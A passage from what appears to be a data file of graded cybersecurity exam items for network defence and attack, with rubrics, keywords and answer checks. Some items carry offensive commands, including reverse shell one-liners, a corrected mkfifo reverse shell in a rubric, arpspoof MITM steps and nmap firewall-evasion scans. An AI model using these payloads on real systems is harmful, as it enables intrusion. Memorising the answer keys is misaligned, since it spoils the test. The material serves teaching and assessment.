1. SYN flood detection (many SYN packets from a single source without completing handshakes)
2. DNS exfiltration (unusually long DNS query names to a single domain)
3. Port scanning (a single source hitting many different ports on the same target)

For each detection goal:
1. Write the exact tcpdump filter expression that would capture the relevant traffic
2. Explain what post-processing logic (in pseudocode or bash) you would apply to the captured output to detect the anomaly
3. What false positive scenarios should be accounted for?

Also explain: Why would you use tcpdump over Wireshark for this task? What are the performance considerations?`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "syn_filter", description: "Writes a correct tcpdump BPF filter for SYN-only packets", points: 2, keywords: ["tcp[tcpflags]", "tcp-syn", "SYN", "tcp[13]", "& 0x02", "!ack", "flags S"], check: "Filter captures SYN packets without ACK set, e.g., 'tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0'" },
      { id: "dns_filter", description: "Writes a tcpdump filter for DNS traffic and describes how to detect long query names", points: 2, keywords: ["port 53", "udp port 53", "query length", "label length", "subdomain", "base64", "hex encoding"], check: "Filter captures DNS traffic; post-processing checks for query names exceeding normal length (e.g., > 50 chars) or high entropy" },
      { id: "portscan_detection", description: "Describes logic to detect port scanning (many distinct dst ports from one src IP)", points: 2, keywords: ["unique ports", "threshold", "distinct destinations", "time window", "source IP grouping"], check: "Groups connections by source IP, counts distinct destination ports in a time window, alerts above threshold" },
      { id: "false_positives", description: "Identifies realistic false positive scenarios for at least two detections", points: 2, keywords: ["false positive", "legitimate", "CDN", "load balancer", "web crawler", "burst traffic", "retransmission"], check: "Names scenarios like legitimate CDN connections (many ports), DNS-over-HTTPS avoiding capture, or SYN retransmissions" },
      { id: "tcpdump_vs_wireshark", description: "Explains why tcpdump is preferred for headless/automated monitoring over Wireshark", points: 2, keywords: ["headless", "CLI", "performance", "no GUI", "scriptable", "kernel BPF", "lower overhead", "automated"], check: "States that tcpdump is CLI-based, scriptable, lower overhead for continuous monitoring on servers without a GUI" }
    ],
    gaps: [
      { if_missing: "syn_filter", gap: "Cannot write BPF filter expressions to match specific TCP flag combinations" },
      { if_missing: "dns_filter", gap: "Does not know how to detect DNS-based data exfiltration through query name analysis" },
      { if_missing: "false_positives", gap: "Designs detection rules without considering false positive rates and legitimate traffic patterns" }
    ]
  }
},

// 14. Port concepts (difficulty 5, compare_contrast)
{
  competencyId: "net-fundamentals",
  subTopic: "port-security",
  questionType: "compare_contrast",
  difficulty: 5,
  questionText: `Compare and evaluate these three approaches to port-level security on a Linux server. For each, explain the mechanism, identify the security model, and argue for when each is the best choice:

**Approach A: iptables DROP policy**
\`\`\`
iptables -P INPUT DROP
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -s 10.0.0.0/8 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
\`\`\`

**Approach B: Socket binding**
\`\`\`python
# Service only binds to internal interface
server.bind(("10.0.0.5", 8080))
\`\`\`

**Approach C: Port knocking**
\`\`\`
# knockd.conf
[SSH]
  sequence = 7000,8000,9000
  seq_timeout = 15
  command = /usr/sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
  tcpflags = syn
  cmd_timeout = 30
  stop_command = /usr/sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
\`\`\`

1. Which approach operates at which layer? What can each one NOT protect against?
2. An attacker has gained code execution on another host in the 10.0.0.0/8 network. How does each approach hold up?
3. Evaluate each for: operational complexity, security strength, auditability, and failure modes.
4. Propose a defense-in-depth design that combines elements of all three.`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "layer_analysis", description: "Correctly identifies that iptables operates at L3/L4, socket binding at the application/OS level, and port knocking at L3/L4 with temporal logic", points: 2, keywords: ["Layer 3", "Layer 4", "kernel", "netfilter", "application layer", "bind address", "temporal", "state machine"], check: "Maps each approach to the correct network/OS layer and explains what each layer can and cannot see" },
      { id: "lateral_movement", description: "Analyzes the insider-threat/lateral-movement scenario for each approach", points: 2, keywords: ["lateral movement", "10.0.0.0/8", "source IP allowed", "internal attacker", "pivot", "compromised host"], check: "Notes that Approach A allows any 10.0.0.0/8 host to SSH, so a compromised internal host can access port 22; Approach B only protects if attacker can't reach 10.0.0.5; Port knocking adds a barrier but the sequence can be sniffed" },
      { id: "operational_tradeoffs", description: "Discusses operational complexity and failure modes for each approach", points: 2, keywords: ["complexity", "failure mode", "lock out", "misconfiguration", "audit", "logging", "stateless"], check: "Addresses practical issues: iptables rules can conflict, bind-address requires app changes, port knocking can lock out admins and is hard to audit" },
      { id: "port_knock_weakness", description: "Identifies that port knocking is security through obscurity and the sequence can be sniffed", points: 2, keywords: ["obscurity", "sniffed", "replay", "sequence observable", "not encryption", "MITM"], check: "States that port knocking sequence travels in cleartext and can be observed by anyone on the network path" },
      { id: "defense_in_depth", description: "Proposes a layered design combining iptables + bind restrictions + additional measures", points: 2, keywords: ["defense in depth", "layered", "combined", "multiple controls", "iptables + bind", "certificate auth", "VPN"], check: "Proposes combining iptables whitelist + application-level bind + key-based auth or VPN for a multi-layered defense" }
    ],
    gaps: [
      { if_missing: "lateral_movement", gap: "Does not evaluate security controls against the scenario of a compromised internal host" },
      { if_missing: "port_knock_weakness", gap: "Treats port knocking as strong security rather than recognizing it as security through obscurity" },
      { if_missing: "defense_in_depth", gap: "Cannot synthesize multiple security mechanisms into a coherent defense-in-depth architecture" }
    ]
  }
},

// 15. Wireshark TCP analysis (difficulty 5, design_solution)
{
  competencyId: "net-fundamentals",
  subTopic: "tcp-analysis-advanced",
  questionType: "design_solution",
  difficulty: 5,
  questionText: `You are investigating a suspected data exfiltration incident. You have a 2GB pcap file from the network tap. The SOC alert says a host (10.10.5.30) may have been exfiltrating data to an external IP over the last 48 hours.

Design your analysis methodology:

1. Write the exact tshark (Wireshark CLI) commands you would use to:
   a. List all external IPs that 10.10.5.30 communicated with, sorted by total bytes transferred
   b. Identify any unusually long-lived TCP connections (> 8 hours)
   c. Extract any files transferred over HTTP
   d. Detect potential DNS tunneling (high volume of DNS queries to a single domain)

2. You find a suspicious connection: 10.10.5.30 maintained a TCP connection to 198.51.100.50:443 for 36 hours with 4.2GB transferred. The traffic is TLS-encrypted. What can you still determine about the exfiltration without decrypting the traffic?

3. How would you distinguish between legitimate cloud backup traffic (e.g., to OneDrive) and actual exfiltration to a C2 server, given that both are encrypted?`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "tshark_commands", description: "Provides working tshark commands for at least 3 of the 4 analysis tasks", points: 2, keywords: ["tshark", "-r", "statistics", "conv", "io,stat", "-T fields", "-e", "dns.qry.name", "export-objects"], check: "Shows syntactically correct tshark commands with appropriate display filters and output formatting" },
      { id: "traffic_volume", description: "Uses conversation statistics or IO graphs to identify data volume per destination", points: 2, keywords: ["conversations", "-z conv,tcp", "-z conv,ip", "bytes", "sorted", "Statistics"], check: "Uses tshark -z conv,ip or similar to aggregate traffic volume by destination" },
      { id: "tls_metadata", description: "Identifies what metadata is available despite TLS encryption (SNI, cert info, timing, volume, JA3)", points: 2, keywords: ["SNI", "Server Name Indication", "certificate", "JA3", "timing", "packet sizes", "flow duration", "TLS handshake"], check: "Lists observable TLS metadata: SNI from ClientHello, server certificate, JA3 fingerprint, timing patterns, data volume" },
      { id: "c2_indicators", description: "Describes behavioral indicators to distinguish C2 from legitimate cloud traffic", points: 2, keywords: ["beacon", "periodic", "jitter", "certificate authority", "domain age", "ASN", "SNI mismatch", "known cloud IPs"], check: "Names C2 indicators: periodic beaconing, unusual certificate issuer, domain reputation, non-standard port usage, data ratio asymmetry" },
      { id: "dns_tunnel_detect", description: "Describes DNS tunneling detection via query frequency, subdomain length/entropy, TXT records", points: 2, keywords: ["DNS tunnel", "subdomain length", "entropy", "TXT record", "query frequency", "unique subdomains", "NXDOMAIN"], check: "Detection approach includes checking for high-entropy subdomains, excessive unique queries to one domain, or large TXT responses" }
    ],
    gaps: [
      { if_missing: "tshark_commands", gap: "Cannot use tshark/Wireshark CLI for automated pcap analysis and traffic statistics" },
      { if_missing: "tls_metadata", gap: "Believes TLS encryption makes traffic completely opaque; does not know about observable metadata (SNI, certificates, JA3)" },
      { if_missing: "c2_indicators", gap: "Cannot distinguish command-and-control traffic patterns from legitimate encrypted traffic" }
    ]
  }
},

// --- net-attacks (Network enumeration & services) ---

// 1. Nmap scanning (difficulty 1, predict_output)
{
  competencyId: "net-attacks",
  subTopic: "nmap-scan-types",
  questionType: "predict_output",
  difficulty: 1,
  questionText: `You run the following nmap scan against a target:

\`\`\`
$ nmap -sS -p 22,80,443,3389,8080 192.168.1.50

Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.50
Host is up (0.0032s latency).

PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
443/tcp  closed   https
3389/tcp filtered ms-wbt-server
8080/tcp open     http-proxy
\`\`\`

Explain what each port state (open, closed, filtered) means in terms of the actual packets nmap sent and received. For each state, describe:
1. What packet did nmap send?
2. What response (if any) did it receive?
3. What does this tell you about the target's configuration?`,
  rubric: {
    maxScore: 6,
    criteria: [
      { id: "syn_scan", description: "Explains that -sS is a SYN scan (half-open) that sends SYN and does not complete the handshake", points: 1, keywords: ["SYN scan", "half-open", "stealth", "SYN packet", "does not complete", "RST"], check: "Describes -sS as sending a SYN and responding to SYN-ACK with RST (never completing the handshake)" },
      { id: "open_state", description: "Open means nmap received a SYN-ACK, indicating a service is listening", points: 2, keywords: ["SYN-ACK", "service listening", "accepting connections", "port is open"], check: "Open: sent SYN, received SYN-ACK, then sent RST to tear down. A service is actively listening." },
      { id: "closed_state", description: "Closed means nmap received a RST/ACK, indicating the port is reachable but no service is listening", points: 1, keywords: ["RST", "RST/ACK", "no service", "reachable but not listening", "host responded"], check: "Closed: sent SYN, received RST. The host is up and reachable, but nothing is listening on that port." },
      { id: "filtered_state", description: "Filtered means no response or ICMP unreachable, indicating a firewall is dropping/rejecting the packets", points: 2, keywords: ["filtered", "no response", "firewall", "dropped", "ICMP unreachable", "blocked", "timeout"], check: "Filtered: sent SYN, received no response (or ICMP unreachable). A firewall is likely blocking traffic to this port." }
    ],
    gaps: [
      { if_missing: "syn_scan", gap: "Does not understand the difference between SYN scan (-sS) and connect scan (-sT) and why SYN scan is called half-open" },
      { if_missing: "filtered_state", gap: "Cannot interpret the 'filtered' state and what it reveals about firewall presence" },
      { if_missing: "closed_state", gap: "Confuses 'closed' with 'filtered' -- does not realize closed means the host is reachable but no service is bound" }
    ]
  }
},

// 2. Banner grabbing (difficulty 1, predict_output)
{
  competencyId: "net-attacks",
  subTopic: "banner-grabbing",
  questionType: "predict_output",
  difficulty: 1,
  questionText: `You connect to several services using netcat for banner grabbing:

\`\`\`
$ nc -v 192.168.1.10 21
Connection to 192.168.1.10 21 port [tcp/ftp] succeeded!
220 (vsFTPd 3.0.3)

$ nc -v 192.168.1.10 22
Connection to 192.168.1.10 22 port [tcp/ssh] succeeded!
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5

$ nc -v 192.168.1.10 25
Connection to 192.168.1.10 25 port [tcp/smtp] succeeded!
220 mail.internal.corp ESMTP Postfix (Ubuntu)

$ nc -v 192.168.1.10 3306
Connection to 192.168.1.10 3306 port [tcp/mysql] succeeded!
J
5.7.38-0ubuntu0.18.04.1??????????????mysql_native_password
\`\`\`

1. What specific software versions can you identify from these banners?
2. For each identified version, what is one specific vulnerability or security concern you would research?
3. What information does the SSH banner reveal beyond just the version number?
4. How could a defender modify these banners to hinder reconnaissance?`,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "version_id", description: "Correctly identifies all four software versions from the banners", points: 2, keywords: ["vsFTPd 3.0.3", "OpenSSH 8.2p1", "Postfix", "MySQL 5.7.38", "Ubuntu"], check: "Lists: vsFTPd 3.0.3, OpenSSH 8.2p1 on Ubuntu, Postfix on Ubuntu, MySQL 5.7.38 on Ubuntu 18.04" },
      { id: "vuln_research", description: "Names at least 2 specific vulnerabilities or CVEs to research for the identified versions", points: 2, keywords: ["CVE", "exploit", "vulnerability", "searchsploit", "known issue", "outdated"], check: "Names specific CVEs or attack vectors for at least two of the services (e.g., MySQL auth bypass, vsFTPd backdoor, OpenSSH user enumeration)" },
      { id: "ssh_info", description: "Explains that the SSH banner reveals the protocol version, software version, and OS distribution", points: 2, keywords: ["protocol 2.0", "Ubuntu", "distribution", "OS fingerprint", "OpenSSH version"], check: "Notes that SSH-2.0 indicates protocol version, OpenSSH_8.2p1 is the exact build, and Ubuntu-4ubuntu0.5 reveals the OS and patch level" },
      { id: "banner_hardening", description: "Suggests practical banner modification techniques", points: 1, keywords: ["banner", "modify", "custom", "hide version", "obscure", "ftpd_banner", "DebianBanner", "server_tokens"], check: "Suggests methods: custom FTP banner in vsftpd.conf, SSH Banner directive or version string removal, Postfix smtpd_banner, MySQL skip-show-database" }
    ],
    gaps: [
      { if_missing: "version_id", gap: "Cannot parse service banners to extract software names, versions, and OS information" },
      { if_missing: "vuln_research", gap: "Identifies versions but does not know how to map them to known vulnerabilities (searchsploit, CVE databases)" },
      { if_missing: "ssh_info", gap: "Does not recognize that SSH banners encode the protocol version, implementation, and sometimes the OS distribution" }
    ]
  }
},

// 3. Service enumeration (difficulty 2, spot_vuln)
{
  competencyId: "net-attacks",
  subTopic: "smb-enumeration",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText: `You've enumerated an SMB server and found the following:

\`\`\`
$ smbclient -L //192.168.1.20 -N

    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
    backup          Disk      Nightly backup share
    public          Disk      Public documents
    IT_scripts      Disk

$ smbclient //192.168.1.20/backup -N
Try "help" to get a list of possible commands.
smb: \\> ls
  .                                   D        0  Mon Jul 21 02:00:00 2025
  ..                                  D        0  Mon Jul 21 02:00:00 2025
  db_dump_2025-07-21.sql.gz           A  52428800  Mon Jul 21 02:00:00 2025
  webapp_config.tar.gz                A   1048576  Mon Jul 21 02:00:00 2025
  credentials_old.xlsx                A    245760  Fri Jun 13 10:30:00 2025

$ crackmapexec smb 192.168.1.20 --shares -u '' -p ''
SMB    192.168.1.20  445  DC01  [*] Windows Server 2019 Build 17763 x64
SMB    192.168.1.20  445  DC01  [+] \\\\192.168.1.20\\: (null session)
SMB    192.168.1.20  445  DC01  [+] Enumerated shares
SMB    192.168.1.20  445  DC01  Share     Permissions  Remark
SMB    192.168.1.20  445  DC01  -----     -----------  ------
SMB    192.168.1.20  445  DC01  backup    READ         Nightly backup share
SMB    192.168.1.20  445  DC01  public    READ,WRITE   Public documents
\`\`\`

Identify all the security issues visible in this enumeration output. Rank them by severity and explain the potential impact of each.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "null_session", description: "Identifies that null session authentication is allowed (anonymous access)", points: 2, keywords: ["null session", "anonymous", "-N", "no password", "unauthenticated", "guest access"], check: "Points out that both smbclient -N and crackmapexec with empty credentials succeeded, meaning null sessions are enabled" },
      { id: "backup_exposure", description: "Identifies the backup share containing database dumps and credentials as critical exposure", points: 2, keywords: ["backup", "db_dump", "credentials", "database dump", "sensitive data", "credentials_old.xlsx"], check: "Flags the backup share as containing a database dump, web app config, and a credentials file accessible anonymously" },
      { id: "write_access", description: "Identifies that the public share has WRITE access for anonymous users", points: 2, keywords: ["WRITE", "public", "writable", "malware", "drop", "plant", "upload"], check: "Notes that anonymous WRITE access to 'public' allows an attacker to plant malicious files or scripts" },
      { id: "hostname_dc", description: "Notes that the hostname DC01 suggests this is a domain controller", points: 1, keywords: ["DC01", "domain controller", "Active Directory", "critical asset", "high value"], check: "Recognizes DC01 as likely a domain controller, making these misconfigurations especially severe" },
      { id: "admin_shares", description: "Notes the presence of default administrative shares (ADMIN$, C$) that could be targeted with credentials", points: 1, keywords: ["ADMIN$", "C$", "admin shares", "administrative", "default shares", "PsExec"], check: "Identifies ADMIN$ and C$ as default Windows admin shares that can provide full system access if credentials are obtained" }
    ],
    gaps: [
      { if_missing: "null_session", gap: "Does not recognize null session access as a fundamental SMB misconfiguration" },
      { if_missing: "backup_exposure", gap: "Does not assess the sensitivity of files found during enumeration (database dumps, credential files)" },
      { if_missing: "write_access", gap: "Does not consider the impact of anonymous write access to network shares (malware staging, document replacement)" }
    ]
  }
},

// 4. SNMP enumeration (difficulty 2, spot_vuln)
{
  competencyId: "net-attacks",
  subTopic: "snmp-enumeration",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText: `During a penetration test, you run SNMP enumeration against a network device:

\`\`\`
$ snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.1
SNMPv2-MIB::sysDescr.0 = STRING: Cisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 15.0(2)SE11, RELEASE SOFTWARE (fc3)
SNMPv2-MIB::sysObjectID.0 = OID: SNMPv2-SMI::enterprises.9.1.716
SNMPv2-MIB::sysUpTime.0 = Timeticks: (432015600) 50 days, 0:02:36.00
SNMPv2-MIB::sysContact.0 = STRING: admin@internal.corp
SNMPv2-MIB::sysName.0 = STRING: CORE-SW-01
SNMPv2-MIB::sysLocation.0 = STRING: Building A, Server Room 2, Rack 5

$ snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.4.20
IP-MIB::ipAdEntAddr.10.0.0.1 = IpAddress: 10.0.0.1
IP-MIB::ipAdEntAddr.172.16.0.1 = IpAddress: 172.16.0.1
IP-MIB::ipAdEntAddr.192.168.1.1 = IpAddress: 192.168.1.1

$ snmpwalk -v2c -c private 192.168.1.1 1.3.6.1.2.1.1.1
SNMPv2-MIB::sysDescr.0 = STRING: Cisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 15.0(2)SE11
\`\`\`

Identify every security issue demonstrated here. What could an attacker do with this information, and what specific attack escalation paths does it enable?`,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "default_community", description: "Identifies that default community strings 'public' and 'private' are in use", points: 2, keywords: ["public", "private", "default community", "community string", "default credentials", "unchanged"], check: "Flags both 'public' (read) and 'private' (read-write) as default SNMP community strings that should have been changed" },
      { id: "private_rw", description: "Explains that the 'private' community string likely has write access, enabling configuration changes", points: 2, keywords: ["write access", "read-write", "RW", "modify config", "reconfigure", "snmpset"], check: "Notes that 'private' is typically the RW community string, allowing an attacker to modify device configuration via SNMP SET" },
      { id: "info_disclosure", description: "Catalogs the sensitive information leaked: IOS version, device model, interfaces, physical location, admin email", points: 2, keywords: ["IOS version", "model", "C2960", "interfaces", "IP addresses", "physical location", "email", "network topology"], check: "Lists: exact IOS version for CVE lookup, device model, all configured IP addresses (revealing network topology), physical location, admin contact" },
      { id: "snmpv2_no_auth", description: "Notes that SNMPv2c transmits community strings in cleartext (no encryption or authentication)", points: 1, keywords: ["cleartext", "no encryption", "SNMPv2c", "plaintext", "v3", "sniffing"], check: "Points out that SNMPv2c community strings travel in plaintext and can be sniffed, and recommends SNMPv3 with authentication" }
    ],
    gaps: [
      { if_missing: "default_community", gap: "Does not recognize default SNMP community strings as a critical misconfiguration" },
      { if_missing: "private_rw", gap: "Does not understand the difference between SNMP read-only and read-write community strings and the impact of RW access" },
      { if_missing: "info_disclosure", gap: "Cannot assess the value of information obtained through SNMP enumeration for further attack planning" }
    ]
  }
},

// 5. ARP spoofing / MITM (difficulty 3, trace_explain)
{
  competencyId: "net-attacks",
  subTopic: "arp-spoofing-mitm",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `An attacker on the same LAN segment (IP: 192.168.1.50, MAC: EE:EE:EE:EE:EE:EE) wants to perform a MITM attack between a victim (192.168.1.100) and the gateway (192.168.1.1, MAC: GG:GG:GG:GG:GG:GG). The attacker runs:

\`\`\`bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100 &
\`\`\`

Trace the full attack step by step:
1. What ARP packets does each arpspoof command send, and what do the victim's and gateway's ARP tables look like after poisoning?
2. When the victim tries to visit http://example.com, trace the packet flow at Layer 2 and Layer 3 through the attacker's machine.
3. Why is ip_forward essential? What happens without it?
4. How would the attacker then intercept HTTP credentials from this position?
5. What would break if the victim uses HTTPS instead?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "arp_packets", description: "Describes the spoofed ARP replies sent to both victim and gateway with the attacker's MAC", points: 2, keywords: ["gratuitous ARP", "ARP reply", "EE:EE:EE", "attacker MAC", "192.168.1.1 is-at EE:EE", "192.168.1.100 is-at EE:EE"], check: "First arpspoof tells the victim that 192.168.1.1 (gateway) is at EE:EE:EE; second tells the gateway that 192.168.1.100 is at EE:EE:EE" },
      { id: "poisoned_tables", description: "Shows the resulting poisoned ARP tables on both victim and gateway", points: 1, keywords: ["victim ARP", "gateway ARP", "both point to attacker", "poisoned cache"], check: "Victim's ARP table maps gateway IP to attacker MAC; gateway's ARP table maps victim IP to attacker MAC" },
      { id: "ip_forward", description: "Explains that ip_forward makes the attacker's kernel forward packets between victim and gateway to maintain connectivity", points: 2, keywords: ["ip_forward", "forwarding", "relay", "transparent", "kernel routing", "without it packets dropped"], check: "Without ip_forward, the attacker's machine would drop the relayed packets, causing a DoS instead of a MITM" },
      { id: "http_intercept", description: "Describes how to intercept HTTP traffic from the MITM position (tcpdump, mitmproxy, ettercap)", points: 2, keywords: ["tcpdump", "mitmproxy", "ettercap", "sniff", "plaintext", "HTTP credentials", "POST data"], check: "From the MITM position, HTTP traffic passes through the attacker in cleartext; tools like mitmproxy or tcpdump can capture credentials from POST requests" },
      { id: "https_limitation", description: "Explains that HTTPS prevents credential sniffing unless the attacker performs SSL stripping or has a forged certificate", points: 1, keywords: ["HTTPS", "TLS", "encrypted", "SSL strip", "certificate warning", "HSTS", "cannot decrypt"], check: "HTTPS encrypts the traffic end-to-end; the attacker would need sslstrip (blocked by HSTS) or a forged cert (triggers browser warning)" }
    ],
    gaps: [
      { if_missing: "arp_packets", gap: "Does not understand the mechanics of ARP spoofing -- what packets are sent and how they poison the cache" },
      { if_missing: "ip_forward", gap: "Does not understand the role of IP forwarding in maintaining transparent MITM (vs. causing a denial of service)" },
      { if_missing: "https_limitation", gap: "Does not understand how TLS/HTTPS defends against MITM attacks even when the attacker controls the network path" }
    ]
  }
},

// 6. DNS poisoning (difficulty 3, trace_explain)
{
  competencyId: "net-attacks",
  subTopic: "dns-poisoning",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `You are testing a corporate network and want to redirect users who try to access "intranet.corp.local" to your attacker machine (10.10.10.50). You have two tools available:

**Tool A: Responder**
\`\`\`
$ sudo responder -I eth0 -rdwv

[+] Listening for events...
[*] [NBT-NS] Poisoned answer sent to 192.168.1.100 for name INTRANET (service: Workstation)
[*] [LLMNR] Poisoned answer sent to 192.168.1.100 for name intranet
[*] [MDNS] Poisoned answer sent to 192.168.1.100 for name intranet.local
\`\`\`

**Tool B: dnsspoof (or ettercap DNS plugin)**
\`\`\`
$ cat dns_hosts.txt
10.10.10.50  intranet.corp.local

$ dnsspoof -i eth0 -f dns_hosts.txt
\`\`\`

1. Explain the fundamental difference in how Responder and dnsspoof achieve name resolution poisoning. What protocols does each target?
2. Why does Responder target LLMNR and NBT-NS specifically? When do Windows machines use these protocols?
3. In what scenario would dnsspoof work but Responder would not? And vice versa?
4. What credentials might you capture after successfully poisoning the name resolution?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "protocol_difference", description: "Explains that Responder targets LLMNR/NBT-NS/mDNS (broadcast/multicast) while dnsspoof intercepts actual DNS queries", points: 2, keywords: ["LLMNR", "NBT-NS", "broadcast", "multicast", "DNS queries", "port 53", "different protocols"], check: "Responder answers LLMNR/NBT-NS/mDNS broadcast queries; dnsspoof intercepts and races actual DNS (port 53) queries with forged responses" },
      { id: "llmnr_fallback", description: "Explains that LLMNR/NBT-NS are fallback protocols used when DNS resolution fails", points: 2, keywords: ["fallback", "DNS fails", "not found", "NXDOMAIN", "local name", "no FQDN", "single-label"], check: "Windows uses LLMNR/NBT-NS when the primary DNS server returns NXDOMAIN or the query is for a short/local name without a DNS suffix" },
      { id: "scenario_comparison", description: "Identifies when each tool is more effective based on network configuration", points: 2, keywords: ["MITM position", "same subnet", "DNS configured", "broadcast domain", "FQDN vs short name"], check: "dnsspoof requires a MITM position or being on the network path; Responder only needs to be on the same broadcast domain and works for names DNS doesn't resolve" },
      { id: "credential_capture", description: "Describes the types of credentials captured (NTLMv2 hashes, HTTP auth, etc.)", points: 2, keywords: ["NTLMv2", "hash", "NTLM", "HTTP", "SMB", "relay", "crack", "challenge-response"], check: "After poisoning, the victim connects to the attacker's fake service, which captures NTLMv2 hashes (from SMB/HTTP NTLM auth) that can be cracked or relayed" }
    ],
    gaps: [
      { if_missing: "protocol_difference", gap: "Conflates LLMNR/NBT-NS poisoning with DNS spoofing; does not understand they target different name resolution protocols" },
      { if_missing: "llmnr_fallback", gap: "Does not know when and why Windows falls back to LLMNR/NBT-NS for name resolution" },
      { if_missing: "credential_capture", gap: "Does not understand how name resolution poisoning leads to credential capture through fake service authentication" }
    ]
  }
},

// 7. Reverse shells (difficulty 3, fix_code)
{
  competencyId: "net-attacks",
  subTopic: "reverse-shell",
  questionType: "fix_code",
  difficulty: 3,
  questionText: `A pentester is trying to get a reverse shell from a compromised Linux web server (10.10.10.20) back to their attack box (10.10.10.5 on port 4444). They set up a listener and try several payloads, but none work:

**Listener (attacker):**
\`\`\`bash
nc -lvp 4444
\`\`\`

**Attempt 1 (on target):**
\`\`\`bash
bash -i >& /dev/tcp/10.10.10.5/4444
\`\`\`

**Attempt 2 (on target):**
\`\`\`bash
python -c 'import socket,os;s=socket.socket();s.connect(("10.10.10.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.system("/bin/sh")'
\`\`\`

**Attempt 3 (on target):**
\`\`\`bash
nc 10.10.10.5 4444 -e /bin/bash
\`\`\`

For each attempt:
1. Identify the bug or issue that prevents it from working
2. Provide the corrected version
3. Explain what the corrected payload does step by step

Also: Once a basic reverse shell is obtained, it lacks features like tab completion and Ctrl+C handling. Explain how to upgrade it to a fully interactive TTY.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "attempt1_fix", description: "Identifies that Attempt 1 is missing stderr redirection (0>&1 or 2>&1) at the end", points: 2, keywords: ["0>&1", "stderr", "2>&1", "redirect", "missing redirect", "/dev/tcp"], check: "Attempt 1 needs 'bash -i >& /dev/tcp/10.10.10.5/4444 0>&1' -- the 0>&1 redirects stdin from the socket" },
      { id: "attempt2_fix", description: "Identifies that Attempt 2 doesn't redirect stderr (fd 2) and uses os.system instead of pty/subprocess", points: 2, keywords: ["dup2", "fileno", "stderr", "fd 2", "os.dup2(s.fileno(),2)", "pty.spawn", "subprocess"], check: "Attempt 2 is missing os.dup2(s.fileno(),2) for stderr, and os.system gives a non-interactive shell; should use pty.spawn or subprocess.call" },
      { id: "attempt3_fix", description: "Identifies that many nc versions don't support -e; suggests mkfifo or ncat instead", points: 2, keywords: ["-e not supported", "mkfifo", "named pipe", "ncat", "fifo", "openbsd netcat", "busybox"], check: "Most nc installs (OpenBSD netcat) lack -e support; fix is mkfifo pipe: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.5 4444 >/tmp/f'" },
      { id: "tty_upgrade", description: "Describes the PTY upgrade process (python pty.spawn, stty raw, etc.)", points: 2, keywords: ["pty.spawn", "python -c", "stty raw", "reset", "xterm", "TERM", "Ctrl+Z", "fg", "interactive TTY"], check: "Steps: python -c 'import pty;pty.spawn(\"/bin/bash\")', then Ctrl+Z, 'stty raw -echo;fg', then 'reset' and set TERM=xterm" }
    ],
    gaps: [
      { if_missing: "attempt1_fix", gap: "Does not understand bash /dev/tcp redirection syntax and how stdin/stdout/stderr must all be redirected for a reverse shell" },
      { if_missing: "attempt3_fix", gap: "Does not know that netcat -e flag is not available in all versions and cannot construct the mkfifo alternative" },
      { if_missing: "tty_upgrade", gap: "Cannot upgrade a basic reverse shell to a fully interactive TTY (missing pty.spawn/stty raw technique)" }
    ]
  }
},

// 8. Firewall evasion (difficulty 3, fix_code)
{
  competencyId: "net-attacks",
  subTopic: "firewall-evasion",
  questionType: "fix_code",
  difficulty: 3,
  questionText: `You are scanning a target behind a firewall. Standard nmap scans return all ports as "filtered." You try several evasion techniques, but the results are still unreliable:

**Attempt 1: Fragmented scan**
\`\`\`bash
nmap -f -sS 192.168.1.50
\`\`\`
Result: All ports still filtered.

**Attempt 2: Decoy scan**
\`\`\`bash
nmap -D 10.0.0.1,10.0.0.2,10.0.0.3 -sS 192.168.1.50
\`\`\`
Result: Scan works but your real IP is still visible.

**Attempt 3: Idle scan setup**
\`\`\`bash
nmap -sI 192.168.1.99 192.168.1.50
\`\`\`
Result: "Idle scan zombie 192.168.1.99 cannot be used because IP ID sequence class: Randomized"

For each attempt:
1. Explain why it failed or is insufficient
2. Provide the corrected command or alternative approach
3. Explain the underlying mechanism that the firewall uses to block the original scan

Additionally, suggest a completely different approach to enumerate services when all scanning is blocked.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "fragment_issue", description: "Explains that modern firewalls reassemble fragments before inspection, and suggests smaller fragment size or different approach", points: 2, keywords: ["reassemble", "fragment reassembly", "stateful inspection", "deep packet inspection", "MTU", "IDS evasion"], check: "Modern stateful firewalls and IDS reassemble fragmented packets before inspection, defeating -f; might try --mtu with specific sizes or use --data-length to vary packet sizes" },
